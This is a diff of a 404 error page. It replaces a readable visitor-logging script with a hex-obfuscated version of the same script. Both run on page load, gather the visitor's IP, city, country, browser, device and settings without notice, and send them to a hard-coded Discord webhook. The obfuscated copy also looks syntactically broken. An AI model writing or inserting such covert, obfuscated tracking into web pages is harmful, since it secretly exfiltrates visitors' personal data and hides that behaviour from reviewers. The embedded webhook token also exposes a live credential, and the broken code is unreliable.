@@ -5,42 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>404 Not Found</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f8f9fa;
-            color: #343a40;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-        }
-        .error-container {
-            max-width: 600px;
-            padding: 2rem;
-        }
-        h1 {
-            font-size: 4rem;
-            margin: 0;
-            color: #dc3545;
-        }
-        h2 {
-            font-size: 1.5rem;
-            margin-top: 0;
-        }
-        p {
-            margin-bottom: 2rem;
-            line-height: 1.6;
-        }
-        a {
-            color: #007bff;
-            text-decoration: none;
-        }
-        a:hover {
-            text-decoration: underline;
-        }
+        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background-color:#f8f9fa;color:#343a40;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}.error-container{max-width:600px;padding:2rem}h1{font-size:4rem;margin:0;color:#dc3545}h2{font-size:1.5rem;margin-top:0}p{margin-bottom:2rem;line-height:1.6}a{color:#007bff;text-decoration:none}a:hover{text-decoration:underline}
     </style>
 </head>
 <body>
@@ -52,115 +17,8 @@
     </div>
 
     <script>
-        // Função para coletar informações do usuário
-        function collectUserData() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenWidth = window.screen.width;
-            const screenHeight = window.screen.height;
-            const language = navigator.language;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const cookiesEnabled = navigator.cookieEnabled;
-            
-            // Usando um serviço alternativo para IP (ipapi.co)
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip || 'IP não disponível';
-                    const country = data.country_name || 'Desconhecido';
-                    const city = data.city || 'Desconhecida';
-                    
-                    sendToDiscord(
-                        ip,
-                        userAgent,
-                        platform,
-                        screenWidth,
-                        screenHeight,
-                        language,
-                        timezone,
-                        cookiesEnabled,
-                        country,
-                        city
-                    );
-                })
-                .catch(error => {
-                    console.error('Erro ao obter IP:', error);
-                    sendToDiscord(
-                        'IP não disponível',
-                        userAgent,
-                        platform,
-                        screenWidth,
-                        screenHeight,
-                        language,
-                        timezone,
-                        cookiesEnabled,
-                        'Desconhecido',
-                        'Desconhecida'
-                    );
-                });
-        }
-
-        // Função para enviar dados para o Discord via webhook
-        function sendToDiscord(ip, userAgent, platform, screenWidth, screenHeight, language, timezone, cookiesEnabled, country, city) {
-            const webhookURL = 'https://discord.com/api/webhooks/1391138971740016793/uEDSN4HVuuzsQYjeSeVIBfPXROy_n4rHJJ-m4Or1T1b4TLi7RjBXDsQI_KkyaEIgB_kQ';
-            
-            const timestamp = new Date().toLocaleString('pt-BR');
-            
-            const embed = {
-                title: "⚠️ Alguém acessou a página de erro 404!",
-                color: 16711680, // Vermelho
-                fields: [
-                    {
-                        name: "📌 IP",
-                        value: ip,
-                        inline: true
-                    },
-                    {
-                        name: "🌎 Localização",
-                        value: `${city}, ${country}`,
-                        inline: true
-                    },
-                    {
-                        name: "🖥️ Dispositivo",
-                        value: `\`${platform}\` (${screenWidth}x${screenHeight})`,
-                        inline: true
-                    },
-                    {
-                        name: "🔍 Navegador",
-                        value: `\`\`\`${userAgent}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "⚙️ Configurações",
-                        value: `Idioma: \`${language}\`\nFuso Horário: \`${timezone}\`\nCookies: \`${cookiesEnabled ? 'Ativados' : 'Desativados'}\``,
-                        inline: false
-                    },
-                    {
-                        name: "⏰ Horário de Acesso",
-                        value: timestamp,
-                        inline: false
-                    }
-                ],
-                footer: {
-                    text: "404 Logger - Dados coletados automaticamente"
-                }
-            };
-            
-            const payload = {
-                embeds: [embed]
-            };
-            
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).catch(error => console.error("Erro ao enviar para Discord:", error));
-        }
-
-        // Executa a coleta de dados quando a página carrega
-        window.onload = collectUserData;
+        (function(){
+            var _0x4a18=["\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x77\x69\x64\x74\x68","\x68\x65\x69\x67\x68\x74","\x6C\x61\x6E\x67\x75\x61\x67\x65","\x72\x65\x73\x6F\x6C\x76\x65\x64\x4F\x70\x74\x69\x6F\x6E\x73","\x74\x69\x6D\x65\x5A\x6F\x6E\x65","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x69\x70","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x63\x69\x74\x79","\x6A\x73\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x61\x70\x69\x2E\x63\x6F\x2F\x6A\x73\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x33\x39\x31\x31\x33\x38\x39\x37\x31\x37\x34\x30\x30\x31\x36\x37\x39\x33\x2F\x75\x45\x44\x53\x4E\x34\x48\x56\x75\x75\x7A\x73\x51\x59\x6A\x65\x53\x65\x56\x49\x42\x66\x50\x58\x52\x4F\x79\x5F\x6E\x34\x72\x48\x4A\x4A\x2D\x6D\x34\x4F\x72\x31\x54\x31\x62\x34\x54\x4C\x69\x37\x52\x6A\x42\x58\x44\x73\x51\x49\x5F\x4B\x6B\x79\x61\x45\x49\x67\x42\x5F\x6B\x51","\x50\x4F\x53\x54","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x65\x6D\x62\x65\x64\x73","\x74\x69\x74\x6C\x65","\xE2\x9A\xA0\xEF\xB8\x8F\x20\x41\x6C\x67\x75\xC3\xA9\x6D\x20\x61\x63\x65\x73\x73\x6F\x75\x20\x61\x20\x70\xC3\xA1\x67\x69\x6E\x61\x20\x64\x65\x20\x65\x72\x72\x6F\x20\x34\x30\x34\x21","\x63\x6F\x6C\x6F\x72","\x31\x36\x37\x31\x31\x36\x38\x30","\x66\x69\x65\x6C\x64\x73","\x6E\x61\x6D\x65","\xF0\x9F\x93\x8C\x20\x49\x50","\x76\x61\x6C\x75\x65","\x69\x6E\x6C\x69\x6E\x65","\x74\x72\x75\x65","\xF0\x9F\x8C\x8E\x20\x4C\x6F\x63\x61\x6C\x69\x7A\x61\xC3\xA7\xC3\xA3\x6F","\xE2\x9C\xA5\xEF\xB8\x8F\x20\x44\x69\x73\x70\x6F\x73\x69\x74\x69\x76\x6F","\x60","\x78","\xEF\xB8\x8F\x20\x43\x6F\x6E\x66\x69\x67\x75\x72\x61\xC3\xA7\xC3\xB5\x65\x73","\x49\x64\x69\x6F\x6D\x61\x3A\x20","\x46\x75\x73\x6F\x20\x48\x6F\x72\xC3\xA1\x72\x69\x6F\x3A\x20","\x43\x6F\x6F\x6B\x69\x65\x73\x3A\x20","\x41\x74\x69\x76\x61\x64\x6F\x73","\x44\x65\x73\x61\x74\x69\x76\x61\x64\x6F\x73","\xE2\x8F\xB0\x20\x48\x6F\x72\xC3\xA1\x72\x69\x6F\x20\x64\x65\x20\x41\x63\x65\x73\x73\x6F","\x66\x6F\x6F\x74\x65\x72","\x34\x30\x34\x20\x4C\x6F\x67\x67\x65\x72\x20\x2D\x20\x44\x61\x64\x6F\x73\x20\x63\x6F\x6C\x65\x74\x61\x64\x6F\x73\x20\x61\x75\x74\x6F\x6D\x61\x74\x69\x63\x61\x6D\x65\x6E\x74\x65","\x6F\x6E\x6C\x6F\x61\x64","\x53\x65\x20\x76\x6F\x63\xEA\x20\x63\x68\x65\x67\x6F\x75\x20\x61\x74\xE9\x20\x61\x71\x75\x69\x2C\x20\x70\x61\x72\x61\x62\xE9\x6E\x73"];function _0x3b9d(){const _0x5b0f2a=navigator[_0x4a18[0]];const _0x5b0f2b=navigator[_0x4a18[1]];const _0x5b0f2c=window[_0x4a18[2]];const _0x5b0f2d=window[_0x4a18[3]];const _0x5b0f2e=navigator[_0x4a18[4]];const _0x5b0f2f=Intl[_0x4a18[5]][_0x4a18[6]];const _0x5b0f30=navigator[_0x4a18[7]];fetch(_0x4a18[12])[_0x4a18[11]]()['then'](_0x1e7a0a=>{const _0x1e7a0b=_0x1e7a0a[_0x4a18[8]]||_0x4a18[34];const _0x1e7a0c=_0x1e7a0a[_0x4a18[9]]||_0x4a18[34];const _0x1e7a0d=_0x1e7a0a[_0x4a18[10]]||_0x4a18[34];_0x1e7a09(_0x1e7a0b,_0x5b0f2a,_0x5b0f2b,_0x5b0f2c,_0x5b0f2d,_0x5b0f2e,_0x5b0f2f,_0x5b0f30,_0x1e7a0c,_0x1e7a0d)})['catch'](_0x1e7a0e=>{console[_0x4a18[34]](_0x4a18[33],_0x1e7a0e);_0x1e7a09(_0x4a18[34],_0x5b0f2a,_0x5b0f2b,_0x5b0f2c,_0x5b0f2d,_0x5b0f2e,_0x5b0f2f,_0x5b0f30,_0x4a18[34],_0x4a18[34])})}function _0x1e7a09(_0x1e7a0a,_0x1e7a0b,_0x1e7a0c,_0x1e7a0d,_0x1e7a0e,_0x1e7a0f,_0x1e7a10,_0x1e7a11,_0x1e7a12,_0x1e7a13){const _0x1e7a14=new Date()[_0x4a18[35]]();const _0x1e7a15={};_0x1e7a15[_0x4a18[18]]=_0x4a18[19];_0x1e7a15[_0x4a18[20]]=parseInt(_0x4a18[21]);_0x1e7a15[_0x4a18[22]]=[{_0x4a18[23]:_0x4a18[24],_0x4a18[25]:_0x1e7a0a,_0x4a18[26]:_0x4a18[27]},{_0x4a18[23]:_0x4a18[28],_0x4a18[25]:`${_0x1e7a13}, ${_0x1e7a12}`,_0x4a18[26]:_0x4a18[27]},{_0x4a18[23]:_0x4a18[29],_0x4a18[25]:`${_0x4a18[30]}${_0x1e7a0c}${_0x4a18[30]} (${_0x1e7a0d}${_0x4a18[31]}${_0x1e7a0e})`,_0x4a18[26]:_0x4a18[27]},{_0x4a18[23]:_0x4a18[32],_0x4a18[25]:`${_0x4a18[30]}${_0x4a18[30]}${_0x1e7a0b}${_0x4a18[30]}${_0x4a18[30]}`,_0x4a18[26]:![],_0x4a18[27]},{_0x4a18[23]:_0x4a18[36],_0x4a18[25]:`${_0x4a18[37]}${_0x4a18[30]}${_0x1e7a0f}${_0x4a18[30]}${_0x4a18[38]}${_0x4a18[30]}${_0x1e7a10}${_0x4a18[30]}${_0x4a18[39]}${_0x4a18[30]}${_0x1e7a11?_0x4a18[40]:_0x4a18[41]}${_0x4a18[30]}`,_0x4a18[26]:![],_0x4a18[27]},{_0x4a18[23]:_0x4a18[42],_0x4a18[25]:_0x1e7a14,_0x4a18[26]:![],_0x4a18[27]}];_0x1e7a15[_0x4a18[43]]={_0x4a18[25]:_0x4a18[44]};const _0x1e7a16={};_0x1e7a16[_0x4a18[22]]=[_0x1e7a15];fetch(_0x4a18[13],{method:_0x4a18[14],headers:{_0x4a18[15]:_0x4a18[16]},body:JSON[_0x4a18[35]](_0x1e7a16)})[_0x4a18[45]](_0x1e7a0e=>console[_0x4a18[34]](_0x4a18[33],_0x1e7a0e))}window[_0x4a18[45]]=_0x3b9d;console[_0x4a18[34]](_0x4a18[46])})();
     </script>
 </body>
 </html>
